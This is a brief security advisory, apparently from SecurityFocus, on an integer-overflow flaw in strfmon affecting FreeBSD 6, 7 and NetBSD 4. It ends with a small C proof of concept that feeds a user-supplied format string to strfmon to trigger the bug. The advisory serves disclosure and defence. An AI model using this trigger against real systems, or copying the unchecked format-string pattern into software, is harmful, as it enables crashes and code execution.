source: http://www.securityfocus.com/bid/28479/info

Multiple BSD platforms are prone to an integer-overflow weakness.

An attacker can exploit this issue through other applications such as PHP to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

This issue affects FreeBSD 6, 7 and NetBSD 4; other platforms may also be affected.

#include <stdio.h>
#include <monetary.h>

int main(int argc, char* argv[]){
char buff[51];
char *bux=buff;
int res;

res=strfmon(bux, 50, argv[1], "0");
return 0;
}